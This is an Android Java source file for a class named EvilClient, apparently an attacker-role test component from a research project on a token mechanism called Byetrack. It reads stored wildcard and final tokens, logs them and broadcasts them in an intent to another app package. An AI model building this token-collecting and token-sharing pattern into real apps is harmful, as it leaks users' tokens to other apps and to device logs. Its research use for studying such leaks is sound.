package de.cispa.evil;

import static androidx.core.content.ContextCompat.startActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;

public class EvilClient {
    private static final String LOGTAG = "EvilClient";
    private static Bundle getByetrackData(Context context, String domainName) {
        Bundle byetrackBundle = new Bundle();
        SharedPreferences wildcardPrefs = context.getSharedPreferences("wildcard_token", Context.MODE_PRIVATE);
        SharedPreferences finalPrefs = context.getSharedPreferences("final_token", Context.MODE_PRIVATE);
        SharedPreferences isAmbientPrefs = context.getSharedPreferences("is_ambient", Context.MODE_PRIVATE);

        boolean isAmbient = isAmbientPrefs.getBoolean("is_ambient", false);
        String wildcardToken = isAmbient? wildcardPrefs.getString("*", "error retrieving ambient token") : wildcardPrefs.getString(domainName, "");
        String finalToken = finalPrefs.getString(domainName, "");

        byetrackBundle.putString("wildcard_tokens", wildcardToken);
        byetrackBundle.putString("final_tokens", finalToken);
        byetrackBundle.putBinder("binder_token", new BinderToken());

        Log.d(LOGTAG, "byetrackData: " + byetrackBundle);
        return byetrackBundle;
    }

    public static void shareByetrackData(Context context, String domainName) {
        Bundle byetrackBundle = getByetrackData(context, domainName);

        Intent intent = new Intent("SHARE_BYETRACK");
        intent.putExtra("testAppsByetrackData", byetrackBundle);
        intent.setPackage("de.cispa.evil"); // target App B packag
        context.sendBroadcast(intent);
    }
}
